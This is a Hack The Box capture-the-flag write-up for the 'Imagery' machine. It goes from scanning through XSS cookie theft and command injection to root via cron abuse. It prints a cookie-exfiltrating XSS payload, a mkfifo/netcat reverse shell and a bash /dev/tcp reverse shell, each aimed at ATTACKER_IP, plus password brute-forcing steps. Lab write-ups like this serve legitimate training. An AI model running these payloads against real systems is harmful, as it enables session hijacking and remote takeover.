# Hack The Box – Imagery

**Platform:** Hack The Box
**Category:** Web → XSS → Session Abuse → Command Injection → RCE → Privilege Escalation
**Host:** Kali Linux

---

## Reconnaissance

Initial scanning identified two exposed services:

![](/writeups/notes/hackthebox–imagery/img/01.png)

```bash
rustscan -a 10.10.11.88 -- -sC -sV -oN nmap
```


Key findings:

SSH (22/tcp)

Flask web application on 8000/tcp

The web service immediately became the primary attack surface.

---

## Web Enumeration

Directory enumeration revealed authentication endpoints and restricted paths:

```bash
dirsearch -u http://10.10.11.88:8000
```

Interesting responses:

/login

/register

/images (401)

/uploads (restricted)

Frontend inspection exposed a bug reporting feature, later confirmed to be exploitable.

---

## XSS → Session Hijacking

The /report_bug endpoint reflected user input without proper sanitization.

A basic XSS payload was used to exfiltrate session cookies:

```bash
<img src=x onerror="document.location='http://ATTACKER_IP/?cookie='+document.cookie">
```


Listener setup:

![](/writeups/notes/hackthebox–imagery/img/02.png)

```bash
nc -lnvp 80
```


Once the admin cookie was received, it was reused to access privileged endpoints:

/admin/users


➡️ Authentication boundary bypassed.

---

## Admin Abuse & Internal Exposure

Admin access revealed:

![](/writeups/notes/hackthebox–imagery/img/03.png)

environment details

application paths

system logs

This confirmed the app was running as the web user inside a Python virtual environment and interacted heavily with the local filesystem.

---

## Command Injection → RCE

The image transformation feature accepted user-controlled parameters.

After intercepting a transformation request in Burp Suite and testing payloads, command injection was confirmed.

Reverse shell listener:

```bash
nc -lnvp 9001
```

Payload used:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc ATTACKER_IP 9001 >/tmp/f
```


Shell obtained:

![](/writeups/notes/hackthebox–imagery/img/04.png)

```bash
id
uid=1001(web) gid=1001(web)
```


At this stage, web exploitation transitioned into full system access.

---

## Local Enumeration & Encrypted Backups

Enumeration revealed an encrypted archive in /var/backup:

![](/writeups/notes/hackthebox–imagery/img/05.png)

```bash
ls -la /var/backup
```


File identified as AES-encrypted using pyAesCrypt:

```bash
file web_20250806_120723.zip.aes
```


The archive password was recovered via wordlist brute-force using a custom Python script and rockyou.txt.

Decryption:

```bash
pyAesCrypt -d web_20250806_120723.zip.aes -o web_20250806_120723.zip
unzip web_20250806_120723.zip
```


The extracted backup contained:

application source code

db.json with user credentials (MD5 hashes)

---

## User Access

Hashes were cracked and reused to switch users:

```bash
su mark
```


User access confirmed and user flag retrieved.

---

## Privilege Escalation (Root)

Checking sudo privileges:

```bash
sudo -l
```


Result:

![](/writeups/notes/hackthebox–imagery/img/06.png)

```bash
(ALL) NOPASSWD: /usr/local/bin/charcol
```


Charcol is a backup utility with cron job management functionality.

Entering interactive mode:

```bash
sudo /usr/local/bin/charcol shell
```


The tool allows scheduling arbitrary commands without validation.

---

## Root Compromise via Cron Abuse

A malicious cron job was added to execute a reverse shell as root:


```bash
auto add --schedule "* * * * *" \
--command "/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/7777 0>&1'" \
--name "RevShell"
```


Listener:

```bash
nc -lnvp 7777
```


Within a minute, a root shell was received:

![](/writeups/notes/hackthebox–imagery/img/07.png)

```bash
id
uid=0(root)
```


Root flag obtained successfully.
